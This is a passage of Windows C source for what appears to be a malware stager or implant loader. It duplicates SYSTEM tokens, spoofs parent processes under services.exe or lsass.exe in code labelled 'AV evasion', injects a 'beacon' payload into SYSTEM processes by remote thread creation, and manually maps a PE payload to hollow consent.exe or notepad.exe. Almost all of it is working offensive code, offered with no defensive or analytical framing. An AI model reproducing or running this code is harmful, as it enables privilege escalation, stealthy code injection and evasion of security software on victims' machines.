    ULONGLONG ullMinCreation = (dwTimeoutMs > 0) ? (ullNow - (ULONGLONG)dwTimeoutMs * 10000ULL) : 0;

    DWORD startTick = GetTickCount();
    do {
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe32 = { sizeof(pe32) };
            if (Process32FirstW(hSnap, &pe32)) {
                do {
                    if (_wcsicmp(pe32.szExeFile, targetFileW) != 0) {
                        continue;
                    }

                    HANDLE hCandidate = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
                    if (!hCandidate) {
                        continue;
                    }

                    FILETIME ftCreation = { 0 };
                    FILETIME ftExit = { 0 };
                    FILETIME ftKernel = { 0 };
                    FILETIME ftUser = { 0 };
                    if (GetProcessTimes(hCandidate, &ftCreation, &ftExit, &ftKernel, &ftUser)) {
                        ULONGLONG ullCreation = ((ULONGLONG)ftCreation.dwHighDateTime << 32) | ftCreation.dwLowDateTime;
                        if (ullCreation < ullMinCreation) {
                            CloseHandle(hCandidate);
                            continue;
                        }
                    }

                    WCHAR procFullPathW[MAX_PATH] = { 0 };
                    DWORD fullPathLen = MAX_PATH;
                    BOOL bMatch = FALSE;
                    DWORD fullPathErr = ERROR_SUCCESS;
                    if (QueryFullProcessImageNameW(
                        hCandidate,
                        0,
                        procFullPathW,
                        &fullPathLen
                    )) {
                        bMatch = (_wcsicmp(procFullPathW, fullPathW) == 0);
                        fullPathErr = ERROR_SUCCESS;
                    } else {
                        fullPathErr = GetLastError();
                    }

                    if (!bMatch && (!bPathMode ||
                        fullPathErr == ERROR_ACCESS_DENIED ||
                        fullPathErr == ERROR_PARTIAL_COPY)) {
                        // On restricted process handles without reliable full-path access, fall back
                        // to executable-name matching with a strict create-time window.
                        bMatch = (_wcsicmp(pe32.szExeFile, targetFileW) == 0);
                    }

                    if (bMatch) {
                        if (pdwPid) {
                            *pdwPid = pe32.th32ProcessID;
                        }
                        CloseHandle(hCandidate);
                        CloseHandle(hSnap);
                        return TRUE;
                    }

                    CloseHandle(hCandidate);
                } while (Process32NextW(hSnap, &pe32));
            }
            CloseHandle(hSnap);
        }

        if ((DWORD)(GetTickCount() - startTick) >= dwTimeoutMs) {
            break;
        }
        Sleep(120);
    } while (TRUE);

    return FALSE;
}

static BOOL ParseHexBytes(LPCSTR lpHex, PBYTE pOut, SIZE_T byteCount) {
    if (!lpHex || !pOut || !byteCount) {
        return FALSE;
    }

    const SIZE_T expectedLen = byteCount * 2;
    char normalized[128] = { 0 };
    SIZE_T normalizedLen = 0;

    for (SIZE_T i = 0; lpHex[i] != '\0'; i++) {
        const char c = lpHex[i];

        if ((c >= '0' && c <= '9') || (c >= 'A' && c <= 'F') || (c >= 'a' && c <= 'f')) {
            if (normalizedLen >= sizeof(normalized) - 1) {
                return FALSE;
            }
            normalized[normalizedLen++] = c;
            continue;
        }

        if (c == '"' || c == '\'' || c == ',' || c == ' ' || c == '\t' || c == '\r' || c == '\n') {
            continue;
        }

        if (c == 'x' || c == 'X') {
            if (normalizedLen > 0 && normalized[normalizedLen - 1] == '0') {
                normalizedLen--;
            }
            continue;
        }

        return FALSE;
    }

    if (normalizedLen != expectedLen) {
        return FALSE;
    }

    for (SIZE_T i = 0; i < byteCount; i++) {
        char hi = normalized[i * 2];
        char lo = normalized[i * 2 + 1];
        BYTE hiVal = 0;
        BYTE loVal = 0;

        if (hi >= '0' && hi <= '9') {
            hiVal = (BYTE)(hi - '0');
        } else if (hi >= 'A' && hi <= 'F') {
            hiVal = (BYTE)(hi - 'A' + 10);
        } else if (hi >= 'a' && hi <= 'f') {
            hiVal = (BYTE)(hi - 'a' + 10);
        } else {
            return FALSE;
        }

        if (lo >= '0' && lo <= '9') {
            loVal = (BYTE)(lo - '0');
        } else if (lo >= 'A' && lo <= 'F') {
            loVal = (BYTE)(lo - 'A' + 10);
        } else if (lo >= 'a' && lo <= 'f') {
            loVal = (BYTE)(lo - 'a' + 10);
        } else {
            return FALSE;
        }

        pOut[i] = (BYTE)((hiVal << 4) | loVal);
    }

    return TRUE;
}

static BOOL GetTokenSessionId(HANDLE hToken, PDWORD pdwSessionId) {
    if (!hToken || !pdwSessionId) {
        return FALSE;
    }

    DWORD dwSize = 0;
    if (!GetTokenInformation(hToken, TokenSessionId, pdwSessionId, sizeof(DWORD), &dwSize)) {
        return FALSE;
    }
    if (dwSize != sizeof(DWORD)) {
        return FALSE;
    }

    return TRUE;
}

static BOOL SetPrimaryTokenSessionId(HANDLE hToken, DWORD dwSessionId) {
    if (!hToken) {
        return FALSE;
    }

    return SetTokenInformation(hToken, TokenSessionId, &dwSessionId, sizeof(dwSessionId));
}

static BOOL IsLikelyPlaceholderUrl(LPCSTR lpUrl) {
    if (!lpUrl || !*lpUrl) {
        return TRUE;
    }

    if (!ContainsCaseInsensitive(lpUrl, "https://") && !ContainsCaseInsensitive(lpUrl, "http://")) {
        return TRUE;
    }

    return (ContainsCaseInsensitive(lpUrl, "your-domain") ||
            ContainsCaseInsensitive(lpUrl, "example.com") ||
            ContainsCaseInsensitive(lpUrl, "placeholder") ||
            ContainsCaseInsensitive(lpUrl, "legitimate-cdn") ||
            ContainsCaseInsensitive(lpUrl, "changeme") ||
            ContainsCaseInsensitive(lpUrl, "setyour") ||
            ContainsCaseInsensitive(lpUrl, "<") ||
            ContainsCaseInsensitive(lpUrl, ">") ||
            ContainsCaseInsensitive(lpUrl, "localhost"));
}

static BOOL ContainsCaseInsensitive(LPCSTR lpHaystack, LPCSTR lpNeedle) {
    if (!lpHaystack || !lpNeedle || !*lpNeedle) {
        return FALSE;
    }

    SIZE_T needleLen = strlen(lpNeedle);
    SIZE_T haystackLen = strlen(lpHaystack);

    if (needleLen == 0 || haystackLen < needleLen) {
        return FALSE;
    }

    for (SIZE_T i = 0; i <= haystackLen - needleLen; i++) {
        if (_strnicmp(lpHaystack + i, lpNeedle, needleLen) == 0) {
            return TRUE;
        }
    }

    return FALSE;
}

static BOOL WaitForProcessStartByImagePath(LPCSTR lpImagePath, DWORD dwTimeoutMs, PDWORD pdwPid) {
    return WaitForSystemProcessStartByPathOrName(lpImagePath, dwTimeoutMs, pdwPid);
}

static BOOL PrepareSystemToken(HANDLE hSystemToken, HANDLE* phPreparedToken, DWORD dwSessionId) {
    LOGE("[*] PrepareSystemToken entry: source=%p requested session=%lu\n", hSystemToken, dwSessionId);
    HANDLE hPreparedToken = NULL;

    if (!phPreparedToken || !hSystemToken) {
        LOGE("[-] PrepareSystemToken missing required args (phPreparedToken=%p, hSystemToken=%p)\n",
            (void*)phPreparedToken, hSystemToken);
        return FALSE;
    }
    *phPreparedToken = NULL;

    if (!DuplicateTokenEx(hSystemToken,
            TOKEN_ALL_ACCESS,
            NULL,
            SecurityDelegation,
            TokenPrimary,
            &hPreparedToken)) {
        LOGE("[-] DuplicateTokenEx(SecurityDelegation, TokenPrimary) failed (%lu), trying SecurityImpersonation.\n", GetLastError());
        if (!DuplicateTokenEx(
                hSystemToken,
                TOKEN_ALL_ACCESS,
                NULL,
                SecurityImpersonation,
                TokenPrimary,
                &hPreparedToken)) {
            LOGE("[-] Failed to duplicate SYSTEM token for launch (%lu)\n", GetLastError());
            return FALSE;
        }
    }

    if (hPreparedToken == NULL) {
        LOGE("[-] Duplicate token handle is NULL for SYSTEM launch (%lu)\n", GetLastError());
        return FALSE;
    }

    if (!TokenHasPrivilege(hPreparedToken, SE_ASSIGNPRIMARYTOKEN_NAME)) {
        LOGE("[!] Prepared SYSTEM token does not expose SeAssignPrimaryTokenPrivilege\n");
    }
    if (!TokenHasPrivilege(hPreparedToken, SE_INCREASE_QUOTA_NAME)) {
        LOGE("[!] Prepared SYSTEM token does not expose SeIncreaseQuotaPrivilege\n");
    }

    if (!EnableSystemTokenPrivileges(hPreparedToken)) {
        LOGE("[*] SYSTEM token launch privileges were not fully enabled; attempting launch with available privileges.\n");
    }

    DWORD tokenSession = (DWORD)-1;
    if (GetTokenSessionId(hPreparedToken, &tokenSession) && tokenSession != dwSessionId) {
        LOGE("[*] Aligning SYSTEM token session from %lu to %lu\n", tokenSession, dwSessionId);
        if (!SetPrimaryTokenSessionId(hPreparedToken, dwSessionId)) {
            LOGE("[-] Failed to align SYSTEM token session for launch token (%lu)\n", GetLastError());
        }
    }

    *phPreparedToken = hPreparedToken;
    return TRUE;
}

// ============================================================================
// SYSTEM EXECUTION REWRITE - AV EVASION HELPERS
// ============================================================================

static BOOL InitParentSpoofing(PEXTENDED_STARTUPINFO pExtSi, DWORD dwSpoofedParentPid) {
    if (!pExtSi) {
        return FALSE;
    }

    ZeroMemory(pExtSi, sizeof(EXTENDED_STARTUPINFO));
    pExtSi->si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    SIZE_T attributeSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    if (!attributeSize) {
        return FALSE;
    }

    pExtSi->pAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        attributeSize
    );
    if (!pExtSi->pAttributeList) {
        return FALSE;
    }

    pExtSi->attributeSize = attributeSize;
    if (!InitializeProcThreadAttributeList(pExtSi->pAttributeList, 1, 0, &attributeSize)) {
        CleanupParentSpoofing(pExtSi);
        return FALSE;
    }

    HANDLE hSpoofedParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, dwSpoofedParentPid);
    if (!hSpoofedParent) {
        CleanupParentSpoofing(pExtSi);
        return FALSE;
    }

    if (!UpdateProcThreadAttribute(
            pExtSi->pAttributeList,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &hSpoofedParent,
            sizeof(HANDLE),
            NULL,
            NULL)) {
        CloseHandle(hSpoofedParent);
        CleanupParentSpoofing(pExtSi);
        return FALSE;
    }

    pExtSi->hParentHandle = hSpoofedParent;
    pExtSi->si.lpAttributeList = pExtSi->pAttributeList;
    return TRUE;
}

static void CleanupParentSpoofing(PEXTENDED_STARTUPINFO pExtSi) {
    if (!pExtSi) {
        return;
    }
    if (pExtSi->hParentHandle) {
        CloseHandle(pExtSi->hParentHandle);
    }
    if (pExtSi->pAttributeList) {
        DeleteProcThreadAttributeList(pExtSi->pAttributeList);
        HeapFree(GetProcessHeap(), 0, pExtSi->pAttributeList);
    }
    ZeroMemory(pExtSi, sizeof(EXTENDED_STARTUPINFO));
}

static DWORD FindLegitimateSystemParent(void) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32W pe32 = { sizeof(pe32) };
    DWORD targetPid = 0;

    const LPCWSTR preferredParents[] = {
        L"services.exe",
        L"svchost.exe",
        L"lsass.exe",
        L"winlogon.exe"
    };

    if (Process32FirstW(hSnap, &pe32)) {
        do {
            for (int i = 0; i < STAGE_ARRAY_COUNT(preferredParents); i++) {
                if (_wcsicmp(pe32.szExeFile, preferredParents[i]) == 0) {
                    if (IsSystemParentProcessBlacklisted(pe32.szExeFile)) {
                        LOGV("[*] Skipping blacklisted parent candidate for hollowing: %ls\n", pe32.szExeFile);
                        continue;
                    }
                    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
                    if (!hProc) {
                        continue;
                    }

                    HANDLE hToken = NULL;
                    if (!OpenProcessToken(hProc, TOKEN_QUERY, &hToken)) {
                        CloseHandle(hProc);
                        continue;
                    }

                    if (IsSystemToken(hToken)) {
                        targetPid = pe32.th32ProcessID;
                        CloseHandle(hToken);
                        CloseHandle(hProc);
                        CloseHandle(hSnap);
                        return targetPid;
                    }

                    CloseHandle(hToken);
                    CloseHandle(hProc);
                }
            }
        } while (Process32NextW(hSnap, &pe32));
    }

    CloseHandle(hSnap);
    return targetPid;
}

static BOOL InjectIntoSystemProcessMemoryOnly(HANDLE hSystemToken, PBYTE pBeacon, DWORD dwBeaconSize) {
    UNREFERENCED_PARAMETER(hSystemToken);
    LOGE("[*] Entering InjectIntoSystemProcessMemoryOnly (payload=%lu bytes).\n", dwBeaconSize);
    if (IsValidPePayload(pBeacon, dwBeaconSize)) {
        LOGE("[-] Stage2 is PE payload; skipping raw memory injection into running SYSTEM process.\n");
        return FALSE;
    }

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        LOGE("[-] CreateToolhelp32Snapshot failed for memory injection candidates (%lu)\n", GetLastError());
        return FALSE;
    }

    PROCESSENTRY32W pe32 = { sizeof(pe32) };
    static const LPCWSTR kMemoryInjectionTargets[] = {
        L"services.exe",
        L"winlogon.exe",
        L"csrss.exe"
    };
    HANDLE hTargetProcess = NULL;
    DWORD targetPid = 0;

    if (Process32FirstW(hSnap, &pe32)) {
        do {
            BOOL bIsTarget = FALSE;
            for (int i = 0; i < STAGE_ARRAY_COUNT(kMemoryInjectionTargets); i++) {
                if (_wcsicmp(pe32.szExeFile, kMemoryInjectionTargets[i]) == 0) {
                    bIsTarget = TRUE;
                    break;
                }
            }

            if (!bIsTarget) {
                continue;
            }

            if (IsSystemTokenCandidateBlacklisted(pe32.szExeFile)) {
                LOGE("[*] Skipping blacklisted memory-injection target %ls (pid %lu)\n", pe32.szExeFile, pe32.th32ProcessID);
                continue;
            }

            HANDLE hProc = OpenProcess(
                PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ |
                PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION,
                FALSE,
                pe32.th32ProcessID
            );
            if (!hProc) {
                continue;
            }

            HANDLE hToken = NULL;
            if (!OpenProcessToken(hProc, TOKEN_QUERY, &hToken)) {
                LOGE("[-] OpenProcessToken failed for memory-injection target %ls PID %lu (%lu)\n", pe32.szExeFile, pe32.th32ProcessID, GetLastError());
                CloseHandle(hProc);
                continue;
            }

            if (IsSystemToken(hToken)) {
                hTargetProcess = hProc;
                targetPid = pe32.th32ProcessID;
                CloseHandle(hToken);
                break;
            }

            CloseHandle(hToken);
            CloseHandle(hProc);
        } while (Process32NextW(hSnap, &pe32));
    }

    CloseHandle(hSnap);

    if (!hTargetProcess) {
        LOGE("[-] No suitable SYSTEM memory-injection target found.\n");
        return FALSE;
    }

    LOGE("[*] Injecting into SYSTEM process PID %lu (memory-only)\n", targetPid);

    PVOID pRemoteBase = VirtualAllocEx(
        hTargetProcess,
        NULL,
        dwBeaconSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (!pRemoteBase) {
        LOGE("[-] VirtualAllocEx failed in target SYSTEM process (%lu)\n", GetLastError());
        CloseHandle(hTargetProcess);
        return FALSE;
    }

    SIZE_T written = 0;
    if (!WriteProcessMemory(hTargetProcess, pRemoteBase, pBeacon, dwBeaconSize, &written) || written != dwBeaconSize) {
        LOGE("[-] WriteProcessMemory failed (%lu)\n", GetLastError());
        VirtualFreeEx(hTargetProcess, pRemoteBase, 0, MEM_RELEASE);
        CloseHandle(hTargetProcess);
        return FALSE;
    }

    DWORD dwOldProtect = 0;
    if (!VirtualProtectEx(hTargetProcess, pRemoteBase, dwBeaconSize, PAGE_EXECUTE_READ, &dwOldProtect)) {
        LOGE("[-] VirtualProtectEx failed (%lu)\n", GetLastError());
        VirtualFreeEx(hTargetProcess, pRemoteBase, 0, MEM_RELEASE);
        CloseHandle(hTargetProcess);
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread(
        hTargetProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pRemoteBase,
        NULL,
        0,
        NULL
    );
    if (!hThread) {
        LOGE("[-] CreateRemoteThread failed (%lu)\n", GetLastError());
        VirtualFreeEx(hTargetProcess, pRemoteBase, 0, MEM_RELEASE);
        CloseHandle(hTargetProcess);
        return FALSE;
    }

    LOGE("[+] Stage2 memory-injected into SYSTEM process PID %lu\n", targetPid);
    if (!ValidateInjectedThreadStartup(hThread, STAGE2_MEMORY_INJECTION_THREAD_TIMEOUT_MS)) {
        VirtualFreeEx(hTargetProcess, pRemoteBase, 0, MEM_RELEASE);
        CloseHandle(hThread);
        CloseHandle(hTargetProcess);
        return FALSE;
    }

    gBeaconImplantPid = targetPid;

    CloseHandle(hThread);
    CloseHandle(hTargetProcess);
    return TRUE;
}

static BOOL BuildMappedSystemPeImage(
    PBYTE pBeacon,
    DWORD dwBeaconSize,
    DWORD_PTR dwRemoteImageBase,
    PBYTE* ppMappedImage,
    SIZE_T* pMappedSize
) {
    UNREFERENCED_PARAMETER(dwBeaconSize);

    if (!pBeacon || !ppMappedImage || !pMappedSize) {
        return FALSE;
    }

    *ppMappedImage = NULL;
    *pMappedSize = 0;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBeacon;
    if (!pDosHeader || pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        LOGV("[-] BuildMappedSystemPeImage: invalid DOS header.\n");
        return FALSE;
    }

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pBeacon + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        LOGV("[-] BuildMappedSystemPeImage: invalid NT signature.\n");
        return FALSE;
    }

    if (pNtHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC &&
        pNtHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        LOGV("[-] BuildMappedSystemPeImage: unsupported PE magic.\n");
        return FALSE;
    }

    SIZE_T imageSize = pNtHeaders->OptionalHeader.SizeOfImage;
    if (imageSize == 0) {
        LOGV("[-] BuildMappedSystemPeImage: zero-size image.\n");
        return FALSE;
    }

    PBYTE pMappedImage = (PBYTE)VirtualAlloc(
        NULL,
        imageSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (!pMappedImage) {
        LOGV("[-] BuildMappedSystemPeImage: failed to allocate local staging buffer (%lu)\n", GetLastError());
        return FALSE;
    }

    SIZE_T copyHeaders = pNtHeaders->OptionalHeader.SizeOfHeaders;
    if (copyHeaders > imageSize) {
        copyHeaders = imageSize;
    }
    memcpy(pMappedImage, pBeacon, copyHeaders);

    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++, pSection++) {
        if (pSection->SizeOfRawData == 0) {
            continue;
        }

        memcpy(
            pMappedImage + pSection->VirtualAddress,
            pBeacon + pSection->PointerToRawData,
            pSection->SizeOfRawData
        );
    }

    if (!ApplyPeRelocations(pMappedImage, pNtHeaders, dwRemoteImageBase)) {
        VirtualFree(pMappedImage, 0, MEM_RELEASE);
        return FALSE;
    }

    if (!ResolvePeImports(pMappedImage, pNtHeaders)) {
        LOGV("[-] BuildMappedSystemPeImage: import resolution failed.\n");
        VirtualFree(pMappedImage, 0, MEM_RELEASE);
        return FALSE;
    }

    *ppMappedImage = pMappedImage;
    *pMappedSize = imageSize;
    return TRUE;
}

static BOOL ApplyPeRelocations(PBYTE pImage, PIMAGE_NT_HEADERS pNtHeaders, DWORD_PTR dwRemoteBase) {
    if (!pImage || !pNtHeaders) {
        return FALSE;
    }

    if (pNtHeaders->OptionalHeader.ImageBase == dwRemoteBase) {
        return TRUE;
    }

    DWORD_PTR delta = dwRemoteBase - pNtHeaders->OptionalHeader.ImageBase;
    PIMAGE_DATA_DIRECTORY pRelocDir = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (pRelocDir->Size == 0) {
        return pNtHeaders->OptionalHeader.ImageBase == dwRemoteBase;
    }

    SIZE_T relocPos = 0;
    SIZE_T relocLimit = pRelocDir->Size;
    PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(pImage + pRelocDir->VirtualAddress);
    while (relocPos + sizeof(*pReloc) <= relocLimit) {
        if (pReloc->VirtualAddress == 0 || pReloc->SizeOfBlock == 0) {
            break;
        }
        if (relocPos + pReloc->SizeOfBlock > relocLimit || pReloc->SizeOfBlock <= sizeof(*pReloc)) {
            break;
        }

        DWORD entryCount = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        PWORD pEntries = (PWORD)((PBYTE)pReloc + sizeof(IMAGE_BASE_RELOCATION));

        for (DWORD i = 0; i < entryCount; i++) {
            WORD entry = pEntries[i];
            WORD type = entry >> 12;
            WORD offset = entry & 0x0FFF;

            if (type == IMAGE_REL_BASED_ABSOLUTE) {
                continue;
            }

            SIZE_T patchOffset = (SIZE_T)pReloc->VirtualAddress + offset;
            if (patchOffset >= pNtHeaders->OptionalHeader.SizeOfImage) {
                continue;
            }

            if (type == IMAGE_REL_BASED_DIR64) {
                PULONGLONG pPatch = (PULONGLONG)(pImage + patchOffset);
                *pPatch += delta;
            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                PDWORD pPatch = (PDWORD)(pImage + patchOffset);
                *pPatch += (DWORD)delta;
            } else if (type == IMAGE_REL_BASED_HIGH) {
                PWORD pPatch = (PWORD)(pImage + patchOffset);
                *pPatch += HIWORD(delta);
            } else if (type == IMAGE_REL_BASED_LOW) {
                PWORD pPatch = (PWORD)(pImage + patchOffset);
                *pPatch += LOWORD(delta);
            }
        }

        relocPos += pReloc->SizeOfBlock;
        pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc->SizeOfBlock);
    }

    return TRUE;
}

static BOOL ResolvePeImports(PBYTE pImage, PIMAGE_NT_HEADERS pNtHeaders) {
    if (!pImage || !pNtHeaders) {
        return FALSE;
    }

    if (pNtHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC &&
        pNtHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        LOGV("[-] ResolvePeImports: unsupported optional header magic.\n");
        return FALSE;
    }

    PIMAGE_DATA_DIRECTORY pImportDir = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (pImportDir->Size == 0) {
        return TRUE;
    }

    PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(pImage + pImportDir->VirtualAddress);
    while (pImport->Name != 0) {
        LPCSTR pLibName = (LPCSTR)(pImage + pImport->Name);
        HMODULE hLib = LoadLibraryA(pLibName);
        if (!hLib) {
            LOGV("[-] ResolvePeImports: failed loading dependency %s (%lu)\n", pLibName, GetLastError());
            return FALSE;
        }

        if (pNtHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
            PIMAGE_THUNK_DATA64 pThunk = (PIMAGE_THUNK_DATA64)(pImage + pImport->FirstThunk);
            PIMAGE_THUNK_DATA64 pOrigThunk = (PIMAGE_THUNK_DATA64)(pImage +
                (pImport->OriginalFirstThunk ? pImport->OriginalFirstThunk : pImport->FirstThunk));
            while (pOrigThunk->u1.AddressOfData != 0) {
                if (pOrigThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                    pThunk->u1.Function = (ULONGLONG)GetProcAddress(
                        hLib,
                        MAKEINTRESOURCEA((WORD)(pOrigThunk->u1.Ordinal & 0xFFFF))
                    );
                } else {
                    PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)(pImage + pOrigThunk->u1.AddressOfData);
                    pThunk->u1.Function = (ULONGLONG)GetProcAddress(hLib, pName->Name);
                }
                if (pThunk->u1.Function == 0) {
                    LOGV("[-] ResolvePeImports: missing symbol in %s\n", pLibName);
                    FreeLibrary(hLib);
                    return FALSE;
                }
                pThunk++;
                pOrigThunk++;
            }
        } else {
            PIMAGE_THUNK_DATA32 pThunk = (PIMAGE_THUNK_DATA32)(pImage + pImport->FirstThunk);
            PIMAGE_THUNK_DATA32 pOrigThunk = (PIMAGE_THUNK_DATA32)(pImage +
                (pImport->OriginalFirstThunk ? pImport->OriginalFirstThunk : pImport->FirstThunk));
            while (pOrigThunk->u1.AddressOfData != 0) {
                if (pOrigThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32) {
                    pThunk->u1.Function = (DWORD_PTR)GetProcAddress(
                        hLib,
                        MAKEINTRESOURCEA((WORD)(pOrigThunk->u1.Ordinal & 0xFFFF))
                    );
                } else {
                    PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)(pImage + pOrigThunk->u1.AddressOfData);
                    pThunk->u1.Function = (DWORD_PTR)GetProcAddress(hLib, pName->Name);
                }
                if (pThunk->u1.Function == 0) {
                    LOGV("[-] ResolvePeImports: missing symbol in %s\n", pLibName);
                    FreeLibrary(hLib);
                    return FALSE;
                }
                pThunk++;
                pOrigThunk++;
            }
        }

        FreeLibrary(hLib);
        pImport++;
    }

    return TRUE;
}

static BOOL ApplyRemotePeSectionProtections(HANDLE hProcess, PVOID pRemoteImage, PIMAGE_NT_HEADERS pNtHeaders, SIZE_T imageSize) {
    if (!hProcess || !pRemoteImage || !pNtHeaders) {
        return FALSE;
    }

    SIZE_T headerProtectSize = pNtHeaders->OptionalHeader.SizeOfHeaders;
    if (headerProtectSize == 0) {
        headerProtectSize = 0x1000;
    }
    if (headerProtectSize > imageSize) {
        headerProtectSize = imageSize;
    }

    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, pRemoteImage, headerProtectSize, PAGE_READONLY, &oldProtect)) {
        LOGV("[-] ApplyRemotePeSectionProtections: failed to protect headers (%lu)\n", GetLastError());
        return FALSE;
    }

    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++, pSection++) {
        SIZE_T sectionSize = pSection->Misc.VirtualSize;
        if (sectionSize == 0) {
            sectionSize = pSection->SizeOfRawData;
        }
        if (sectionSize == 0) {
            continue;
        }
        if ((SIZE_T)pSection->VirtualAddress + sectionSize > imageSize) {
            sectionSize = imageSize - pSection->VirtualAddress;
        }

        DWORD protect = PAGE_READONLY;
        if (pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if (pSection->Characteristics & IMAGE_SCN_MEM_WRITE) {
                protect = PAGE_EXECUTE_READWRITE;
            } else {
                protect = PAGE_EXECUTE_READ;
            }
        } else if (pSection->Characteristics & IMAGE_SCN_MEM_WRITE) {
            protect = PAGE_READWRITE;
        } else if (pSection->Characteristics & IMAGE_SCN_MEM_READ) {
            protect = PAGE_READONLY;
        }

        if (!VirtualProtectEx(hProcess, (PBYTE)pRemoteImage + pSection->VirtualAddress, sectionSize, protect, &oldProtect)) {
            LOGV("[-] ApplyRemotePeSectionProtections: failed for section %d (%lu)\n", i, GetLastError());
            return FALSE;
        }
    }

    return TRUE;
}

static BOOL HollowLegitimateSystemProcess(HANDLE hSystemToken, PBYTE pBeacon, DWORD dwBeaconSize) {
    LOGE("[*] Entering HollowLegitimateSystemProcess (payload=%lu bytes).\n", dwBeaconSize);
    if (!IsValidPePayload(pBeacon, dwBeaconSize)) {
        LOGE("[-] Stage2 is not a valid PE payload for process hollowing path.\n");
        return FALSE;
    }

    char systemRoot[MAX_PATH] = { 0 };
    if (!GetWindowsDirectoryA(systemRoot, MAX_PATH)) {
        LOGE("[-] Failed to resolve system root for hollowing target (%lu)\n", GetLastError());
        return FALSE;
    }

    char legitimateExe[MAX_PATH] = { 0 };
    _snprintf(legitimateExe, MAX_PATH, "%s\\System32\\consent.exe", systemRoot);

    if (GetFileAttributesA(legitimateExe) == INVALID_FILE_ATTRIBUTES) {
        LOGE("[*] Primary hollowing target missing (%s), using fallback notepad.exe\n", legitimateExe);
        _snprintf(legitimateExe, MAX_PATH, "%s\\System32\\notepad.exe", systemRoot);
    }

    LOGE("[*] Using %s as hollowing target\n", legitimateExe);

    PROCESS_INFORMATION pi = { 0 };
    DWORD dwPid = 0;
    BOOL bSpawned = FALSE;
    HANDLE hSpawnThread = NULL;
    const DWORD hollowCreateFlags = CREATE_SUSPENDED;

    bSpawned = SpawnProcessWithPrimaryTokenEx(
        hSystemToken,
        legitimateExe,
        &pi.hProcess,
        &dwPid,
        &hSpawnThread,
        hollowCreateFlags
    );
    if (bSpawned) {
        pi.dwProcessId = dwPid;
        pi.hThread = hSpawnThread;
        LOGE("[*] Created SYSTEM process PID %lu via primary token\n", pi.dwProcessId);
    } else {
        DWORD spoofedParentPid = FindLegitimateSystemParent();
        if (!spoofedParentPid) {
            LOGE("[-] Could not find legitimate SYSTEM parent for spoofing\n");
            return FALSE;
        }

        LOGE("[*] Primary token hollowing spawn failed; spoofing parent PID %lu\n", spoofedParentPid);

        EXTENDED_STARTUPINFO extSi;
        if (!InitParentSpoofing(&extSi, spoofedParentPid)) {
            LOGE("[-] Failed to initialize parent PID spoofing\n");
            return FALSE;
        }

        HANDLE hImpersonationToken = NULL;
        if (!DuplicateTokenForImpersonation(hSystemToken, &hImpersonationToken)) {
            CleanupParentSpoofing(&extSi);
            return FALSE;
        }

        if (!SetThreadToken(NULL, hImpersonationToken)) {
            LOGE("[-] Failed to set thread token for hollowing spawn (%lu)\n", GetLastError());
            CloseHandle(hImpersonationToken);
            CleanupParentSpoofing(&extSi);
            return FALSE;
        }

        char cmdLine[MAX_PATH * 2] = { 0 };
        _snprintf(cmdLine, sizeof(cmdLine), "\"%s\"", legitimateExe);

        bSpawned = CreateProcessA(
            NULL,
            cmdLine,
            NULL,
            NULL,
            FALSE,
